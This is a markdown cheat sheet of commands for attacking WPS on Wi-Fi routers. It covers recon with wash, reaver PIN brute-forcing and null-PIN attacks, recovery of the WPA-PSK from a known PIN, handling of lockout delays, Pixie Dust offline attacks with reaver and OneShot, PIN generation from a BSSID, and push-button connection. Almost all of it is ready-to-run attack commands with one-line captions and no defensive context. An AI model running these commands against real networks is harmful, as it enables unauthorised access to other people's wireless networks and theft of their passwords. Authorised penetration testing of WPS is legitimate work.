#wifi #wps #reaver #pixie-dust

# Attacking WPS

Related: [wpa-wpa2](wpa-wpa2.md) · [tools](tools.md) · [basics](basics.md)

## Recon
```bash
wash -i wlan0mon
```
Enumerate WPS-enabled networks (`-j` verbose).

## Online PIN Brute-Force (reaver)
```bash
reaver -i mon0 -b AE:EB:B0:11:A0:1E -c 1
```
Brute-force the WPS PIN.

```bash
reaver -b 5A:1A:59:B7:E7:97 -c 1 -i mon0 -p " "
```
WPS null-PIN attack.

```bash
sudo reaver -i mon0 -b 60:38:E0:2A:4F:21 -p 88766197
```
Retrieve the WPA-PSK using a known PIN.

```bash
sudo reaver -l 100 -r 3:45 -i wlan0mon -b 60:38:E0:XX:XX:XX
```
Brute-force with lock-delay handling (100s lock, sleep 45s every 3 attempts).

## Offline (Pixie Dust)
```bash
reaver -K 1 -vvv -b 86:FC:9F:5D:67:4E -c 1 -i mon0
```
Pixie Dust attack with Reaver.

```bash
python3 oneshot.py -b 86:FC:9F:5D:67:4E -i wlan0mon -K
```
Pixie Dust attack with OneShot.

## PIN Generation
```bash
wpspin -A 60:38:E0:A2:3D:2A
```
Generate likely WPS PINs from the BSSID.

## Push-Button (PBC)
```bash
python3 /opt/OneShot/oneshot.py -i wlan0mon --pbc
```
Connect via WPS PBC (`wpa_cli wps_pbc <BSSID>` alternative).
